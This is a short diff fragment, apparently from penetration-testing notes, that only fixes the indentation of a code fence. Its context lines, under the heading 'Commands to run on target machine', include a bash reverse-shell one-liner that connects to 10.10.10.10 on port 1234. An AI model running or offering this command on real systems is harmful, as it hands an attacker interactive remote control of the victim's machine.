@@ -21,7 +21,7 @@ Commands to run on target machine:
 ``` bash
 
 	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
-	```
+```
 
 	or
 
